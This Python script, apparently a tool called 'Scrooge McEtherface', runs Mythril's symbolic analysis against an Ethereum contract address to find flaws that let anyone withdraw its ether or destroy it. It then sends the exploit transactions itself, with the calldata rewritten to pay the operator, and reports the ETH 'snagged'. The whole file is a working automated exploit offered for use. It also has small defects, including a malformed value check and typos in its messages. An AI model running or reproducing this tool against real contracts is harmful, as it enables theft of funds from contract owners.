#!/usr/bin/env python

import os
import re
import sys
import json
from mythril.mythril import Mythril
from web3 import Web3, HTTPProvider
from configparser import ConfigParser
from enum import Enum

# Uncomment the lines below to get verbose logging.
# import logging
# logging.basicConfig(level=logging.INFO)


class InvulnerableError(Exception):
    pass


class VulnType(Enum):
    KILL_ONLY = 0
    KILL_AND_WITHDRAW = 1
    ETHER_THEFT = 2


class Vulnerability:
    def __init__(self, type, description, transactions):

        self.type = type
        self.description = description
        self.transactions = transactions


def critical(message):
    print(message)
    sys.exit()


def w3_request_blocking(sender, receiver, value, data):
    tx_hash = w3.eth.sendTransaction(
        {"to": receiver, "from": sender, "data": data, "value": value, "gas": 5000000}
    )

    print(
        "Transaction sent successfully, tx-hash: %s. Waiting for transaction to be mined..."
        % tx_hash.hex()
    )
    tx_hash = w3.eth.waitForTransactionReceipt(tx_hash, timeout=120)

    return tx_hash


def get_vulns(target_address, tx_count):
    myth = Mythril(enable_online_lookup=False, onchain_storage_access=True)

    if re.match(r"^https", rpc):
        rpchost = rpc[8:]
        rpctls = True
    else:
        rpchost = rpc[7:]
        rpctls = False

    myth.set_api_rpc(rpchost, rpctls)
    myth.load_from_address(target_address)

    report = myth.fire_lasers(
        strategy="dfs",
        modules=["ether_thief", "suicide"],
        address=target_address,
        execution_timeout=45,
        max_depth=22,
        transaction_count=tx_count,
        verbose_report=True,
    )

    nIssues = len(report.issues)

    if nIssues == 0:
        raise InvulnerableError

    vulns = []

    for i in range(0, nIssues):
        issue = report.sorted_issues()[i]

        tx = issue["debug"].replace("\n", " ").replace("'", '"')
        transactions = json.loads(tx)

        if "withdraw its balance" in issue["description"]:
            _type = VulnType.KILL_AND_WITHDRAW
            description = "Looks line anyone can kill this contract and steal its balance."
        elif "withdraw ETH" in issue["description"]:
            _type = VulnType.ETHER_THEFT
            description = "Looks like anyone can withdraw ETH from this contract."
        else:
            _type = VulnType.KILL_ONLY
            description = "Anybody can accidentally kill this contract."

        vulns.append(Vulnerability(_type, description, transactions))

    if len(vulns):
        return vulns

    raise InvulnerableError


def commence_attack(sender_address, target_address, vuln):
    print(vuln.description)

    for _id, tx in vuln.transactions.items():
        data = tx["calldata"].replace(
            "deadbeefdeadbeefdeadbeefdeadbeefdeadbeef", sender_address[2:]
        )
        value = int(tx["call_value"], 16)

        if value > w3.fromWei(value, 'ether') > 0.99:
            critical(
                "Not proceeding with attack as it requires sending a lot of ETH. Too risky."
            )
        elif value > 0:
            print("WARNING: You;ll be transferring %.05f ETH wth this transaction" % w3.fromWei(value, 'ether'))

        print(
            "You are about to send the following transaction:\nFrom: %s, To: %s, Value: %d\nData: %s"
            % (sender_address, target_address, value, str(tx["calldata"]))
        )
        response = input("Are you sure you want to proceed (y/N)?\n")

        if response == "y":
            try:
                w3_request_blocking(sender_address, target_address, value, data)
            except Exception as e:
                print("Error sending transaction: %s" % str(e))

        else:
            sys.exit()

# Main

config_path = os.path.join(os.path.dirname(os.path.realpath(__file__)), "config.ini")

try:
    config = ConfigParser()
    config.optionxform = str
    config.read(config_path, "utf-8")

    sender_address = Web3.toChecksumAddress(config["settings"]["sender"])
    rpc = config["settings"]["rpc"]
except KeyError:
    critical("Missing or invalid configuration file. See config.ini.example.")
except ValueError as e:
    critical("Invalid Ethereum address: " + config["settings"]["sender"])

try:
    tx_count = int(config["settings"]["symbolic_tx_count"])
except:
    tx_count = 2

try:
    target_address = Web3.toChecksumAddress(sys.argv[1])
except IndexError:
    critical("Usage: scrooge <target_address>")
except ValueError as e:
    critical("Invalid Ethereum address: " + sys.argv[1])

w3 = Web3(HTTPProvider(rpc))

# Commence attack

print(
    "Scrooge McEtherface at your service.\nExploring %s over %d symbolic transactions.\n"
    % (target_address, tx_count)
)

balance = w3.fromWei(w3.eth.getBalance(sender_address), "ether")

print("Your initial account balance is %.05f ETH.\nCharging lasers..." % balance)

# FIXME: Handle multiple issues being returned

try:
    vuln = get_vulns(target_address, tx_count)[0]
except InvulnerableError:
    critical("No attack vector found.")
except Exception as e:
    critical("Error during analysis: %s" % str(e))

target_balance = w3.eth.getBalance(target_address)
commence_attack(sender_address, target_address, vuln)

_balance = w3.fromWei(w3.eth.getBalance(sender_address), "ether")

if _balance > balance:
    print(
        "Snagged %.05f ETH. Your final account balance is %.05f ETH.\n"
        % (_balance - balance, _balance)
    )
else:
    print("Attack unsuccessful (no ETH transferred).")
